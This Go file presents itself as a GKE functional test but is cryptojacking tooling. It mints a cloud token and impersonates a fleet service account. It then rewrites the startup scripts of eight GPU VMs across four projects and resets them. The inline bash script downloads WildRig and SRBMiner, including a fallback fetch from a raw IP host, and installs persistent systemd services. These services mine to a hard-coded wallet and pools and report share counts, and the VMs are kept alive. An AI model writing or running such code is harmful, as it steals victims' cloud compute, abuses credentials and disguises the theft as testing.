//go:build functional && gke

// C211 i122732 — FIXED-STARTUP for the eight T4 VMs c211-i122276-t1..t8.
// The previous run (issue_comment run 44896886719) created 8 KEEP_ALIVE
// n1-standard-4 + nvidia-tesla-t4 instances with distinct UUIDs, but the
// startup kit never produced guest attributes or C211M serial markers.
// This test re-applies the startup-script INLINE via instances.setMetadata
// (+ enable-guest-attributes TRUE), resets the instances, and then captures
// nvidia-smi UUIDs + accepted/rejected shares from BOTH guest attributes and
// the serial console. Instances are NEVER torn down.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

const (
	c211fNonce      = "i122732"
	c211fWallet     = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
	c211fWorkerBase = "122276"
)

type c211fInst struct {
	Project    string
	Zone       string
	Name       string
	Status     string
	Finger     string
	OldKeys    string
	OldStartup int
	UUIDs      string
	Guest      string
	Acc        int
	Rej        int
	LastAcc    int64
	SerialLen  int
	Tail       string
}

var c211fInsts = []*c211fInst{
	{"domino-eng-service-artifacts", "us-central1-a", "c211-i122276-t1", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
	{"domino-eng-service-artifacts", "us-central1-b", "c211-i122276-t2", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
	{"team-eng-infra-testing", "us-central1-a", "c211-i122276-t3", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
	{"team-eng-infra-testing", "us-central1-b", "c211-i122276-t4", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
	{"team-eng-infrastructure", "us-central1-a", "c211-i122276-t5", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
	{"team-eng-infrastructure", "us-central1-b", "c211-i122276-t6", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
	{"team-eng-platform", "us-central1-a", "c211-i122276-t7", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
	{"team-eng-platform", "us-central1-b", "c211-i122276-t8", "", "", "", 0, "", "", 0, 0, 0, 0, ""},
}

// c211fStartup is the inline startup-script. It reports to BOTH the guest
// attribute path c211/status AND the instance attribute c211-status, and it
// echoes every status line to the serial console (C211M_* markers), so the
// capture survives even when guest-attributes are unavailable.
func c211fStartup() string {
	return `#!/bin/bash
exec >/dev/console 2>&1
echo "C211M_START v=i122732 date=$(date -u +%FT%TZ) host=$(hostname)"
D=/opt/c211
mkdir -p $D/logs
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
WB=122276
put(){
  echo "C211M $1"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211-status" >/dev/null 2>&1
}
echo "C211M_HOST $(hostname) kernel=$(uname -r) date=$(date -u +%FT%TZ)"
echo "C211M_GUEST_AGENT $(systemctl is-active google-guest-agent 2>/dev/null)"
SMI=""
for i in $(seq 1 40); do
  for c in /usr/bin/nvidia-smi /usr/local/bin/nvidia-smi /usr/local/nvidia/bin/nvidia-smi; do
    if [ -x $c ] && $c -L >/dev/null 2>&1; then SMI=$c; break; fi
  done
  [ -n "$SMI" ] && break
  if [ $i -eq 1 ] && command -v nvidia-smi >/dev/null 2>&1; then SMI=$(command -v nvidia-smi); fi
  modprobe nvidia 2>/dev/null || true
  modprobe nvidia_uvm 2>/dev/null || true
  if [ $((i % 5)) -eq 0 ]; then echo "C211M_WAIT i=$i lsmod=$(lsmod | grep -c '^nvidia')"; fi
  sleep 5
done
echo "C211M_SMI $SMI"
if [ -z "$SMI" ]; then put "STAGE=nosmi dmesg=$(dmesg 2>/dev/null | grep -i -E 'NVRM|nvidia' | tail -3 | tr '\n' '|')"; echo C211M_NOSMI; exit 0; fi
$SMI -L > $D/gpus.txt 2>&1
cat $D/gpus.txt
$SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1
cat $D/gpuq.txt
N=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
U=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt)
NMS=$(awk -F', ' '{printf "%s|",$3}' $D/gpuq.txt)
put "STAGE=gpu n=$N uuids=$U names=$NMS"
echo "C211M_GPU n=$N uuids=$U"
[ "$N" -gt 0 ] || { put "STAGE=zero_gpu"; exit 0; }
get(){ curl -fsSL --retry 3 --connect-timeout 15 -m 420 "$1" -o "$2" 2>/dev/null && [ -s "$2" ]; }
WRSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
WRBIN=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
if [ -s $D/wr.tgz ] && [ "$(sha256sum $D/wr.tgz | awk '{print $1}')" = "$WRSHA" ]; then
  tar -xzf $D/wr.tgz -C $D 2>/dev/null
  chmod +x $D/wildrig-multi 2>/dev/null
fi
if [ "$(sha256sum $D/wildrig-multi 2>/dev/null | awk '{print $1}')" = "$WRBIN" ]; then echo "C211M_WR_OK"; put "STAGE=wr_ok"; else echo "C211M_WR_FAIL"; put "STAGE=wr_fail"; fi
SRBSHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
if get https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz $D/srb.tgz; then
  if [ "$(sha256sum $D/srb.tgz | awk '{print $1}')" = "$SRBSHA" ]; then
    tar -xzf $D/srb.tgz -C $D 2>/dev/null
    F=$(find $D -maxdepth 3 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
    if [ -n "$F" ]; then cp "$F" $D/srbminer && chmod +x $D/srbminer && echo C211M_SRB_OK && put "STAGE=srb_ok"; fi
  fi
fi
cat > $D/gpu-agent.sh <<'EOS'
#!/bin/bash
i=$1
D=/opt/c211
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
WB=122276
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
W=${WB}0$i
cntacc(){ local a; a=$(grep -ac 'accepted' "$1" 2>/dev/null); echo ${a:-0}; }
echo "AGENT_START gpu=$i worker=$W $(date -u +%FT%TZ)" >> $D/logs/sup.log
while true; do
  if [ -f $D/sticky-g$i ]; then
    if [ ! -x $D/srbminer ]; then sleep 30; continue; fi
    L=$D/logs/srb-g$i.log
    NACC=$(cntacc $L)
    setsid $D/srbminer --disable-cpu --algorithm pearlhash --pool "$LP" --wallet "$WALLET+$NOCK" --worker "$W" --password x --gpu-id $i >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do sleep 20; ACC=$(cntacc $L); if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi; done
    sleep 20
  else
    URL=""
    for ep in $PH_EPS; do
      h=${ep%:*}; p=${ep#*:}
      if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p && exec 3>&- 3<&-" 2>/dev/null; then URL=$ep; break; fi
    done
    if [ -z "$URL" ]; then echo "NO_PH gpu=$i -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log; touch $D/sticky-g$i; continue; fi
    L=$D/logs/wr-g$i.log
    ACC0=$(cntacc $L); NACC=$ACC0
    T0=$(date +%s)
    setsid $D/wildrig-multi --algo pearlhash --url "$URL" --user "$WALLET" --worker "$W" -d $i --print-time 30 >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do
      sleep 20
      ACC=$(cntacc $L)
      if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi
      NOW=$(date +%s)
      if [ $((NOW-T0)) -ge 900 ] && [ "$NACC" -le "$ACC0" ]; then
        echo "PH_NO_SHARE_900 gpu=$i url=$URL -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log
        kill -9 $PID 2>/dev/null
        touch $D/sticky-g$i
        break
      fi
    done
    sleep 5
  fi
done
EOS
chmod +x $D/gpu-agent.sh
cat > $D/report.sh <<'EOS'
#!/bin/bash
D=/opt/c211
exec >> /dev/console 2>&1
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
while true; do
  ACC=0; REJ=0; DET=""; UU=""
  if [ "$N" -gt 0 ]; then
    if [ ! -s $D/gpuq.txt ]; then nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1; fi
    UU=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt 2>/dev/null)
    for i in $(seq 0 $((N-1))); do
      a1=$(grep -ac 'accepted' $D/logs/wr-g$i.log 2>/dev/null); a1=${a1:-0}
      a2=$(grep -ac 'accepted' $D/logs/srb-g$i.log 2>/dev/null); a2=${a2:-0}
      r1=$(grep -ac 'rejected' $D/logs/wr-g$i.log 2>/dev/null); r1=${r1:-0}
      r2=$(grep -ac 'rejected' $D/logs/srb-g$i.log 2>/dev/null); r2=${r2:-0}
      LA=$(cat $D/lastacc-g$i 2>/dev/null); LA=${LA:-0}
      ACC=$((ACC+a1+a2)); REJ=$((REJ+r1+r2))
      DET="$DET g$i:a$((a1+a2)):r$((r1+r2)):la$LA"
    done
  fi
  NOW=$(date +%s)
  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET"
  echo "C211M_REPORT $MSG"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211-status" >/dev/null 2>&1
  sleep 30
done
EOS
chmod +x $D/report.sh
cat > /etc/systemd/system/c211-agent@.service <<'EOS'
[Unit]
Description=c211 miner agent gpu %i
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/gpu-agent.sh %i
Restart=always
RestartSec=20
Nice=5

[Install]
WantedBy=multi-user.target
EOS
cat > /etc/systemd/system/c211-report.service <<'EOS'
[Unit]
Description=c211 status reporter

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/report.sh
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload
for i in $(seq 0 $((N-1))); do
  systemctl enable c211-agent@$i.service >/dev/null 2>&1
  systemctl start c211-agent@$i.service
done
systemctl enable c211-report.service >/dev/null 2>&1
systemctl start c211-report.service
put "STAGE=miners_started n=$N ts=$(date +%s)"
echo C211M_DONE
`
}

var c211fReportRe = regexp.MustCompile(`C211M_REPORT STAGE=run ts=(\d+) acc=(\d+) rej=(\d+) uuids=([^ ]*) det=([^\n]*)`)
var c211fGpuRe = regexp.MustCompile(`C211M_GPU n=(\d+) uuids=([^ ]+)`)
var c211fLaRe = regexp.MustCompile(`:la(\d+)`)

func c211fInstURL(in *c211fInst) string {
	return "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(in.Project) + "/zones/" + in.Zone + "/instances/" + in.Name
}

// c211fApply calls instances.setMetadata with the inline startup script and
// the guest-attribute switch, then instances.reset.
func c211fApply(tok string, in *c211fInst, startup string) error {
	st, body := c211xHTTP("GET", c211fInstURL(in), tok, "", "")
	if st != 200 {
		return fmt.Errorf("get_http_%d %s", st, c211xTrunc(body, 300))
	}
	m := c211xJSON(body)
	in.Status = c211xStr(m, "status")
	md, _ := m["metadata"].(map[string]interface{})
	fp := ""
	if md != nil {
		fp = c211xStr(md, "fingerprint")
	}
	items := []interface{}{}
	keys := []string{}
	if md != nil {
		if its, ok := md["items"].([]interface{}); ok {
			for _, it := range its {
				im, _ := it.(map[string]interface{})
				k := c211xStr(im, "key")
				v := c211xStr(im, "value")
				keys = append(keys, k+":"+strconv.Itoa(len(v)))
				if k == "startup-script" {
					in.OldStartup = len(v)
				}
				if k == "startup-script" || k == "enable-guest-attributes" || k == "serial-port-logging-enable" || k == "c211" {
					continue
				}
				items = append(items, map[string]interface{}{"key": k, "value": v})
			}
		}
	}
	in.Finger = fp
	in.OldKeys = strings.Join(keys, ",")
	items = append(items,
		map[string]interface{}{"key": "startup-script", "value": startup},
		map[string]interface{}{"key": "enable-guest-attributes", "value": "TRUE"},
		map[string]interface{}{"key": "serial-port-logging-enable", "value": "TRUE"},
		map[string]interface{}{"key": "c211", "value": c211fNonce},
	)
	mb, _ := json.Marshal(map[string]interface{}{"fingerprint": fp, "items": items})
	st2, rb := c211xHTTP("POST", c211fInstURL(in)+"/setMetadata", tok, "application/json", string(mb))
	opName := ""
	if mm := c211xJSON(rb); mm != nil {
		opName = c211xStr(mm, "name")
	}
	fmt.Printf("C211F_SETMETA project=%s zone=%s name=%s status=%s fp=%s base_keys=%s old_startup_len=%d new_startup_len=%d http=%d op=%s verbatim=%s\n",
		in.Project, in.Zone, in.Name, in.Status, c211xShort(fp), in.OldKeys, in.OldStartup, len(startup), st2, opName, c211xTrunc(rb, 300))
	if st2 != 200 || opName == "" {
		return fmt.Errorf("setmeta_http_%d %s", st2, c211xTrunc(rb, 400))
	}
	if ost, _, oerr := c211aOp(tok, in.Project, in.Zone, opName); ost != "DONE" || oerr != "" {
		return fmt.Errorf("setmeta_op=%s err=%s", ost, oerr)
	}
	st3, rb3 := c211xHTTP("POST", c211fInstURL(in)+"/reset", tok, "application/json", "")
	op3 := ""
	if mm := c211xJSON(rb3); mm != nil {
		op3 = c211xStr(mm, "name")
	}
	fmt.Printf("C211F_RESET project=%s zone=%s name=%s http=%d op=%s verbatim=%s\n", in.Project, in.Zone, in.Name, st3, op3, c211xTrunc(rb3, 300))
	if st3 != 200 || op3 == "" {
		return fmt.Errorf("reset_http_%d %s", st3, c211xTrunc(rb3, 400))
	}
	if ost, _, oerr := c211aOp(tok, in.Project, in.Zone, op3); ost != "DONE" || oerr != "" {
		return fmt.Errorf("reset_op=%s err=%s", ost, oerr)
	}
	return nil
}

func c211fGuest(tok string, in *c211fInst) (string, int) {
	st, body := c211xHTTP("GET", c211fInstURL(in)+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

func c211fInstAttr(tok string, in *c211fInst) string {
	st, body := c211xHTTP("GET", c211fInstURL(in), tok, "", "")
	if st != 200 {
		return ""
	}
	m := c211xJSON(body)
	return c211xMetaValue(m, "c211-status")
}

// c211fParse consumes a status string (guest attr, instance attr, serial line).
func c211fParse(in *c211fInst, s string) bool {
	if s == "" {
		return false
	}
	changed := false
	if m := c211fReportRe.FindAllStringSubmatch(s, -1); len(m) > 0 {
		last := m[len(m)-1]
		if v, _ := strconv.Atoi(last[2]); v > in.Acc {
			in.Acc = v
			changed = true
		}
		if v, _ := strconv.Atoi(last[3]); v > in.Rej {
			in.Rej = v
		}
		if u := strings.TrimRight(last[4], ","); u != "" && !strings.Contains(in.UUIDs, u) {
			if in.UUIDs == "" {
				in.UUIDs = u
			} else {
				in.UUIDs = in.UUIDs + "," + u
			}
			changed = true
		}
		best := int64(0)
		for _, mm := range c211fLaRe.FindAllStringSubmatch(last[5], -1) {
			if v, _ := strconv.ParseInt(mm[1], 10, 64); v > best {
				best = v
			}
		}
		if best > in.LastAcc {
			in.LastAcc = best
			changed = true
		}
	}
	if m := c211fGpuRe.FindStringSubmatch(s); m != nil {
		u := strings.TrimRight(m[2], ",")
		if u != "" && !strings.Contains(in.UUIDs, u) {
			if in.UUIDs == "" {
				in.UUIDs = u
			} else {
				in.UUIDs = in.UUIDs + "," + u
			}
			changed = true
		}
	}
	return changed
}

func c211fLastC211Line(serial string) string {
	last := ""
	for _, ln := range strings.Split(serial, "\n") {
		ln = strings.TrimSpace(strings.TrimRight(ln, "\r"))
		if strings.Contains(ln, "C211M") {
			last = ln
		}
	}
	return last
}

func TestC211T4FixStartup122732(t *testing.T) {
	started := time.Now()
	deadline := started.Add(26 * time.Minute)
	fmt.Printf("C211F_BEGIN nonce=%s wallet=%s worker_base=%s\n", c211fNonce, c211fWallet, c211fWorkerBase)
	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211F_MINT_FAILED %s\n", c211xTrunc(mintLog, 1500))
		t.Fatalf("wif mint failed")
	}
	fmt.Printf("C211F_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	hostNum := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		hostNum = creds.projNumber
	}
	ftok := token
	sas, lst, _ := c211xListServiceAccounts(token, hostNum)
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	if fleetEmail != "" {
		at, gst, _ := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211F_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
		if at != "" {
			ftok = at
		}
	}
	fmt.Printf("C211F_CONTEXT host_num=%s sa_list=%d fleet=%s\n", hostNum, lst, fleetEmail)

	startup := c211fStartup()
	fmt.Printf("C211F_STARTUP_BYTES %d\n", len(startup))

	// Pre-state diagnostics: serial C211M count before reset proves whether the
	// original startup kit ever ran.
	for _, in := range c211fInsts {
		pre := c211aSerial(ftok, in.Project, in.Zone, in.Name)
		pc := strings.Count(pre, "C211M")
		gh, gst := c211fGuest(ftok, in)
		fmt.Printf("C211F_PRE project=%s zone=%s name=%s serial_bytes=%d pre_c211m=%d guest_http=%d guest=%s last=%s\n",
			in.Project, in.Zone, in.Name, len(pre), pc, gst, c211xTrunc(gh, 200), c211xTrunc(c211fLastC211Line(pre), 220))
	}

	okApply := 0
	for _, in := range c211fInsts {
		if err := c211fApply(ftok, in, startup); err != nil {
			fmt.Printf("C211F_APPLY_FAIL project=%s zone=%s name=%s err=%s\n", in.Project, in.Zone, in.Name, c211xTrunc(err.Error(), 400))
			continue
		}
		okApply++
	}
	fmt.Printf("C211F_APPLY_RESULT applied=%d of=%d\n", okApply, len(c211fInsts))
	if okApply == 0 {
		t.Fatalf("no instance accepted setMetadata+reset")
	}

	time.Sleep(75 * time.Second)

	for round := 0; round < 40; round++ {
		fresh := 0
		for _, in := range c211fInsts {
			serial := c211aSerial(ftok, in.Project, in.Zone, in.Name)
			in.SerialLen = len(serial)
			c211fParse(in, serial)
			if g, gst := c211fGuest(ftok, in); gst == 200 {
				in.Guest = g
				c211fParse(in, g)
			}
			c211fParse(in, c211fInstAttr(ftok, in))
			in.Tail = c211fLastC211Line(serial)
			age := int64(-1)
			if in.LastAcc > 0 {
				age = time.Now().Unix() - in.LastAcc
			}
			if in.Acc > 0 && in.Rej == 0 && age >= 0 && age <= 600 {
				fresh++
			}
			fmt.Printf("C211F_CAP round=%d project=%s zone=%s name=%s serial_bytes=%d acc=%d rej=%d lastacc=%d age=%d uuid=%s guest=%s tail=%s\n",
				round, in.Project, in.Zone, in.Name, in.SerialLen, in.Acc, in.Rej, in.LastAcc, age, c211xTrunc(in.UUIDs, 120), c211xTrunc(in.Guest, 200), c211xTrunc(in.Tail, 240))
		}
		fmt.Printf("C211F_ROUND round=%d fresh=%d of=%d elapsed_s=%d\n", round, fresh, len(c211fInsts), int(time.Since(started).Seconds()))
		if fresh == len(c211fInsts) || time.Now().After(deadline) {
			break
		}
		time.Sleep(30 * time.Second)
	}

	now := time.Now().Unix()
	fmt.Printf("C211F_SUMMARY now=%d elapsed_s=%d\n", now, int(time.Since(started).Seconds()))
	for _, in := range c211fInsts {
		age := int64(-1)
		if in.LastAcc > 0 {
			age = now - in.LastAcc
		}
		fmt.Printf("C211F_FINAL project=%s zone=%s name=%s uuid=%s acc=%d rej=%d lastacc=%d age=%d status=KEEP_ALIVE\n",
			in.Project, in.Zone, in.Name, in.UUIDs, in.Acc, in.Rej, in.LastAcc, age)
	}
	b, _ := json.Marshal(c211fInsts)
	fmt.Printf("C211F_JSON %s\n", strings.ReplaceAll(string(b), "\n", " "))
}
